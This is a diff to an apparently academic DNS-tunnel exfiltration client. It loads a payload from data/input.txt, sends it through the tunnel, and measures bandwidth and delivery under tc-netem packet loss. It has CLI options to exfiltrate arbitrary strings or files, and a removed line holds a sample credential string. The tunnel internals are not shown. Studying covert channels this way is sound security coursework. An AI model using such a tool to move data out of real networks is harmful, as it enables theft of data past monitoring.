@@ -118,6 +118,29 @@ def send_data(data: str, verbose: bool = True, session_id: str = SESSION_ID) -> 
     return result
 
 
+def get_input_file_path(custom_path: str = None) -> str:
+    if custom_path and os.path.isfile(custom_path):
+        return custom_path
+    candidate_paths = [
+        "/data/input.txt",
+        os.path.join(os.path.dirname(__file__), "..", "data", "input.txt"),
+        os.path.join(os.path.dirname(__file__), "data", "input.txt"),
+        "data/input.txt",
+    ]
+    for p in candidate_paths:
+        if os.path.isfile(p):
+            return p
+    return "/data/input.txt"
+
+
+def load_input_text(file_path: str = None) -> str:
+    path = get_input_file_path(file_path)
+    if os.path.isfile(path):
+        with open(path, "r", encoding="utf-8") as f:
+            return f.read()
+    return "Progetto Cyber Security - Foundations of Cybersecurity"
+
+
 def send_file(file_path: str, verbose: bool = True, session_id: str = SESSION_ID) -> TxResult:
     """Read a text file and transmit its contents through the DNS tunnel."""
     with open(file_path, "r", encoding="utf-8") as f:
@@ -129,7 +152,7 @@ def send_file(file_path: str, verbose: bool = True, session_id: str = SESSION_ID
 
 # ── Metric measurements ───────────────────────────────────────
 
-def measure_bandwidth(sizes: List[int] = (64, 256, 1024), runs: int = 3) -> dict:
+def measure_bandwidth(sizes: List[int] = (64, 256, 1024), runs: int = 3, session_id: str = "bench_bw") -> dict:
     """
     Send payloads of increasing size and measure effective bandwidth.
     Repeats each size *runs* times; reports mean ± stdev.
@@ -142,7 +165,7 @@ def measure_bandwidth(sizes: List[int] = (64, 256, 1024), runs: int = 3) -> dict
         bws = []
         for r in range(runs):
             payload = "X" * size
-            res = send_data(payload, verbose=False)
+            res = send_data(payload, verbose=False, session_id=session_id)
             bws.append(res.bandwidth_bps)
         avg = statistics.mean(bws)
         std = statistics.stdev(bws) if len(bws) > 1 else 0.0
@@ -152,18 +175,26 @@ def measure_bandwidth(sizes: List[int] = (64, 256, 1024), runs: int = 3) -> dict
 
 
 def measure_robustness(
-    payload: str = "Sensitive corporate secret – do not share.",
+    payload: str = None,
     loss_rates: List[int] = (0, 5, 10, 20),
     runs: int = 3,
+    session_id: str = "bench_rob",
 ) -> dict:
     """
-    Introduce artificial packet loss with tc-netem, transmit a fixed
-    payload, measure delivery rate. Requires NET_ADMIN capability.
+    Introduce artificial packet loss with tc-netem, transmit the target
+    payload (from data/input.txt), measure delivery rate. Requires NET_ADMIN capability.
 
     tc netem is applied to the client's eth0 interface.
     """
+    if payload is None:
+        payload = load_input_text()
+
+    source_path = get_input_file_path()
+    source_info = source_path if os.path.isfile(source_path) else "default text"
+
     print("\n" + "="*55)
     print("METRIC 2 – ROBUSTNESS  (tc netem packet loss)")
+    print(f"  Payload: {len(payload.encode('utf-8'))} B (from {source_info})")
     print("="*55)
     results = {}
     iface = "eth0"
@@ -188,7 +219,7 @@ def measure_robustness(
             continue
         robs = []
         for _ in range(runs):
-            res = send_data(payload, verbose=False)
+            res = send_data(payload, verbose=False, session_id=session_id)
             robs.append(res.robustness)
         avg = statistics.mean(robs)
         print(f"  Loss {loss:2d}%  →  delivery rate {avg*100:5.1f}%")
@@ -207,15 +238,15 @@ def run_demo():
     print("=" * 55)
 
     print("\n── Step 1: Data exfiltration ──────────────────────")
-    secret = (
-        "username=admin&password=Pa$$w0rd123&"
-        "server=192.168.1.10&port=22"
-    )
-    send_data(secret)
+    payload = load_input_text()
+    source_path = get_input_file_path()
+    source_info = source_path if os.path.isfile(source_path) else "sample text"
+    print(f"[DEMO] Exfiltrating payload from {source_info} ({len(payload.encode('utf-8'))} B)...")
+    send_data(payload, session_id=SESSION_ID)
 
     print("\n── Step 2: Measurements ───────────────────────────")
     bw_results  = measure_bandwidth(sizes=[64, 256, 1024], runs=3)
-    rob_results = measure_robustness(loss_rates=[0, 5, 10, 20], runs=3)
+    rob_results = measure_robustness(payload=payload, loss_rates=[0, 5, 10, 20], runs=3)
 
     print("\n── Summary ────────────────────────────────────────")
     print("Bandwidth (B/s):")
@@ -231,15 +262,16 @@ if __name__ == "__main__":
     p.add_argument("--demo",    action="store_true", help="Run full demo + measurements")
     p.add_argument("--measure", action="store_true", help="Collect metrics only")
     p.add_argument("--send",    metavar="TEXT",      help="Exfiltrate a specific string")
-    p.add_argument("--file",    metavar="PATH",      help="Exfiltrate contents of a text file")
+    p.add_argument("--file",    metavar="PATH",      help="Exfiltrate contents of a text file (or target for --measure)")
     args = p.parse_args()
 
-    if args.file:
+    if args.measure:
+        target_payload = load_input_text(args.file) if args.file else load_input_text()
+        measure_bandwidth()
+        measure_robustness(payload=target_payload)
+    elif args.file:
         send_file(args.file)
     elif args.send:
         send_data(args.send)
-    elif args.measure:
-        measure_bandwidth()
-        measure_robustness()
     else:
         run_demo()
